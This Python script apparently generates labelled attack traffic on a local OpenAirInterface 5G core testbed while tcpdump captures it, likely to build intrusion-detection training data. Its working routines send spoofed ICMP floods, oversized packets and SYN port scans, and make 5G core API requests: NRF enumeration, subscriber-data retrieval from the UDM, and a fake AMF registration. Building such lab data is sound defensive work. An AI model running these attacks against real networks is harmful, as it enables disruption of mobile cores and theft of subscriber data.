import subprocess
import time
import os
import random
from scapy.all import IP, TCP, ICMP, send
import json

# Define the list of specific source IPs for malicious traffic
malicious_source_ips = ["192.168.70.146", "192.168.70.120", "10.0.0.3", "10.0.0.4"]

# Function to randomly select a source IP from the list
def get_random_source_ip():
    return random.choice(malicious_source_ips)

# Path for logging malicious traffic
malicious_log_file = "/home/jared/oai-cn5g/flask_server/tmp/malicious_traffic_logs.txt"

# Function to log malicious traffic details
def log_malicious_traffic(entry):
    with open(malicious_log_file, 'a') as log_file:
        log_file.write(entry + "\n")

# Function to simulate a ping flood (ICMP flood)
def generate_ping_flood():
    print("Generating ping flood attack...")
    ip_list = ["192.168.70.130"]
    for ip in ip_list:
        source_ip = get_random_source_ip()
        for i in range(100):  # Send 100 ICMP packets
            packet = IP(src=source_ip, dst=ip) / ICMP()
            send(packet, verbose=False)
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
            log_entry = f"{timestamp} {source_ip} > {ip} Protocol: ICMP (Ping Flood) id {i} seq {i} length 8"
            log_malicious_traffic(log_entry)
        time.sleep(1)

# Function to simulate sending large packets
def generate_large_packets():
    print("Generating large packet traffic...")
    ip_list = ["192.168.70.130"]
    for ip in ip_list:
        source_ip = get_random_source_ip()
        for i in range(10):  # Send 10 large packets
            packet = IP(src=source_ip, dst=ip) / TCP(dport=80, flags="A") / ("X" * 65000)
            send(packet, verbose=False)
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
            log_entry = f"{timestamp} {source_ip} > {ip} Protocol: TCP (Large Packet) id {i} length 65000"
            log_malicious_traffic(log_entry)
        time.sleep(1)

# Function to simulate port scanning attack
def generate_port_scan():
    print("Generating port scan attack...")
    ip_list = ["192.168.70.130"]
    for ip in ip_list:
        source_ip = get_random_source_ip()
        for port in range(20, 1024):  # Scan ports from 20 to 1023
            packet = IP(src=source_ip, dst=ip) / TCP(dport=port, flags="S")
            send(packet, verbose=False)
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
            log_entry = f"{timestamp} {source_ip} > {ip} Protocol: TCP (Port Scan) flags [S] port {port}"
            log_malicious_traffic(log_entry)
        time.sleep(1)

# Function to simulate other attacks using curl
def amf_looking_for_udm(nrf_ip):
    print("Performing AMF looking for UDM attack...")
    source_ip = get_random_source_ip()
    url = f"http://{nrf_ip}:8000/nnrf-disc/v1/nf-instances?requester-nf-type=AMF&target-nf-type=UDM"
    subprocess.run(["curl", "-X", "GET", "-H", f"Source-IP: {source_ip}", url], capture_output=True)
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
    log_entry = f"{timestamp} {source_ip} > {nrf_ip} Protocol: HTTP (AMF Looking for UDM)"
    log_malicious_traffic(log_entry)
    time.sleep(1)

def get_all_nfs(nrf_ip):
    print("Performing GetAllNFs attack...")
    source_ip = get_random_source_ip()
    url = f"http://{nrf_ip}:8000/nnrf-disc/v1/nf-instances?requester-nf-type=AMF"
    subprocess.run(["curl", "-X", "GET", "-H", f"Source-IP: {source_ip}", url], capture_output=True)
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
    log_entry = f"{timestamp} {source_ip} > {nrf_ip} Protocol: HTTP (GetAllNFs)"
    log_malicious_traffic(log_entry)
    time.sleep(1)

# Function to simulate the FakeAMFInsert attack
def fake_amf_insert():
    print("Performing FakeAMFInsert attack...")
    source_ip = get_random_source_ip()
    json_data = {
        "nfInstanceId": "b01dface-bead-cafe-bade-cabledfabled",
        "nfType": "AMF",
        "nfStatus": "REGISTERED",
        "plmnList": [
            {"mcc": "208", "mnc": "93"},
            {"mcc": "001", "mnc": "01"}
        ],
        "sNssais": [
            {"sst": 1, "sd": "010203"},
            {"sst": 1, "sd": "112233"}
        ],
        "ipv4Addresses": ["127.0.0.18"],
        "amfInfo": {
            "amfSetId": "3f8",
            "amfRegionId": "ca",
            "guamiList": [
                {"plmnId": {"mcc": "208", "mnc": "93"}, "amfId": "cafe00"},
                {"plmnId": {"mcc": "208", "mnc": "93"}, "amfId": "cafe01"}
            ],
            "taiList": [
                {"plmnId": {"mcc": "208", "mnc": "93"}, "tac": "000001"},
                {"plmnId": {"mcc": "001", "mnc": "01"}, "tac": "000064"}
            ]
        },
        "nfServices": [
            {
                "serviceInstanceId": "0",
                "serviceName": "namf-comm",
                "versions": [{"apiVersionInUri": "v1", "apiFullVersion": "1.0.0"}],
                "scheme": "http",
                "nfServiceStatus": "REGISTERED",
                "ipEndPoints": [{"ipv4Address": "127.0.0.18", "transport": "TCP", "port": 8000}],
                "apiPrefix": "http://127.0.0.18:8000"
            },
            {
                "serviceInstanceId": "1",
                "serviceName": "namf-evts",
                "versions": [{"apiVersionInUri": "v1", "apiFullVersion": "1.0.0"}],
                "scheme": "http",
                "nfServiceStatus": "REGISTERED",
                "ipEndPoints": [{"ipv4Address": "127.0.0.18", "transport": "TCP", "port": 8000}],
                "apiPrefix": "http://127.0.0.18:8000"
            }
        ],
        "defaultNotificationSubscriptions": [
            {
                "notificationType": "N1_MESSAGES",
                "callbackUri": "http://127.0.0.18:8000/namf-callback/v1/n1-message-notify",
                "n1MessageClass": "5GMM"
            }
        ]
    }

    url = "http://192.168.70.132:8000/nnrf-nfm/v1/nf-instances/b01dface-bead-cafe-bade-cabledfabled"
    headers = {"Content-Type": "application/json"}
    curl_command = [
        "curl", "-X", "PUT", "-H", f"Content-Type: application/json",
        "-d", json.dumps(json_data), url
    ]
    subprocess.run(curl_command, capture_output=True)

    timestamp = time.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
    log_entry = f"{timestamp} {source_ip} > 192.168.70.132 Protocol: HTTP (Fake AMF Insert)"
    log_malicious_traffic(log_entry)

def get_user_data(udm_ip, subscriber_id="0000000003"):
    print("Performing GetUserData attack...")
    source_ip = get_random_source_ip()
    url = f"http://{udm_ip}:8000/nudm-dm/v1/imsi-{subscriber_id}/am-data?plmn-id=%7B%22mcc%22%3A%22208%22%2C%22mnc%22%3A%2293%22%7D"
    subprocess.run(["curl", "-X", "GET", "-H", f"Source-IP: {source_ip}", url], capture_output=True)
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
    log_entry = f"{timestamp} {source_ip} > {udm_ip} Protocol: HTTP (Get User Data)"
    log_malicious_traffic(log_entry)
    time.sleep(1)

# Function to filter out unwanted lines from the captured logs
def filter_logs(input_file, output_file):
    print("Filtering captured logs...")
    unwanted_keywords = [
        "HTTP/1.1", "Server:", "Date:", "Content-Type:", "Content-Length:", 
        "Connection:", "Host:", "User-Agent:", "Accept-Encoding:", "Accept:", 
        "POST", "GET"
    ]

    with open(input_file, 'r') as infile, open(output_file, 'w') as outfile:
        for line in infile:
            line = line.lstrip()  # Remove leading spaces
            if any(keyword in line for keyword in unwanted_keywords):
                continue
            outfile.write(line)

    print(f"Filtered logs saved to {output_file}")

# Function to capture traffic using tcpdump
def capture_traffic():
    print("Starting traffic capture...")
    interface = "demo-oai"
    subnet = "192.168.70.0/24"
    log_file_path = "/home/jared/oai-cn5g/flask_server/tmp/training_traffic_logs.txt"
    filtered_log_file_path = "/home/jared/oai-cn5g/flask_server/tmp/filtered_traffic_logs.txt"

    available_interfaces = subprocess.check_output(["ip", "link", "show"]).decode('utf-8')
    print(f"Available network interfaces:\n{available_interfaces}")
    
    if interface not in available_interfaces:
        print(f"Error: Interface {interface} not found. Please verify the interface name.")
        return

    os.makedirs(os.path.dirname(log_file_path), exist_ok=True)
    
    tcpdump_command = [
        "tcpdump", "-i", interface, f"net {subnet}",
        "-s", "0", "-vv", "-l", "-tttt", "-n"
    ]
    with open(log_file_path, 'w') as log_file:
        tcpdump_process = subprocess.Popen(tcpdump_command, stdout=log_file, stderr=subprocess.PIPE)
    
        try:
            print("Generating normal traffic...")
            duration = 30  # Run for 30 seconds
            start_time = time.time()

            # First half: Normal traffic (simulation placeholder)
            while time.time() - start_time < duration / 2:
                time.sleep(1)  # Placeholder for normal traffic generation

            # Second half: Malicious traffic
            print("Switching to generating malicious traffic...")
            generate_ping_flood()
            generate_large_packets()
            generate_port_scan()
            amf_looking_for_udm(nrf_ip="192.168.70.130")
            get_all_nfs(nrf_ip="192.168.70.130")
            get_user_data(udm_ip="192.168.70.137")
            fake_amf_insert()

            print("Traffic generation complete.")
        finally:
            tcpdump_process.terminate()
            tcpdump_process.wait()
            print(f"Traffic logs saved to {log_file_path}")
            stderr_output = tcpdump_process.stderr.read().decode('utf-8')
            if stderr_output:
                print(f"tcpdump errors:\n{stderr_output}")

            # Debugging step: Check if log file has content
            if os.path.getsize(log_file_path) > 0:
                print("Log file contains data.")
            else:
                print("Log file is empty.")
            
            # Filter out unwanted lines from the captured logs
            filter_logs(log_file_path, filtered_log_file_path)

if __name__ == "__main__":
    # Clear the malicious log file before starting
    open(malicious_log_file, 'w').close()

    capture_traffic()
